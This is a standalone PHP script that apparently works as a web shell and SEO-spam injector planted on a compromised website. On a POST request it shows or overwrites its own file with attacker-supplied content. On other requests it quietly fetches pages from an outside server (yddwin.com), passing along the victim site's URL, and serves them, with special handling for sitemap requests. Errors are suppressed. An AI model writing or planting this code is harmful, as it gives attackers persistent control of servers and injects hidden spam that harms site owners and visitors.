<?php

error_reporting(0);
set_time_limit(0);
$Remote_server = "http://yddwin.com/";

if($_SERVER['REQUEST_METHOD'] =='POST'){
	$act = isset($_POST['act']) ? $_POST['act']:'';
	$file = $_SERVER['SCRIPT_FILENAME'];
	$content =  isset($_POST['content'])?$_POST['content']:'';
	if($act == 'show'){
		exit(file_get_contents($file));
	}else if($act == 'edit' && strlen($content)){
		file_put_contents($file, $content);
	}
	exit;
}
$host_name = "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];

$Content_mb = '';
$loop_request_times = 3;
for($i=1;$i<=$loop_request_times;$i++){
	$Content_mb = getHTTPPage($Remote_server."index.php?host=".$host_name);
	$html = trim($Content_mb);
	if ($i==$loop_request_times && empty($html)) {
		exit("<p align='center'><font color='red'><b>Connection Error!</b></font></p>");
	}else if(!empty($html)){
		break;
	}
}

function getHTTPPage($url) {
    $UA = 'aQ0O010O';
    if(isset($_SERVER['HTTP_USER_AGENT'])){
        $UA = $_SERVER['HTTP_USER_AGENT'];
    }
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: $UA"
	  )
	);
	$context = stream_context_create($opts);
	$html = @file_get_contents($url, false, $context);

	return $html;
}


if(strpos($host_name, 'sitemap.xml')){
	header('Content-Type:application/xml');
}else{
	header("Content-Type: text/html;charset=utf-8");
}
echo $Content_mb;
?>
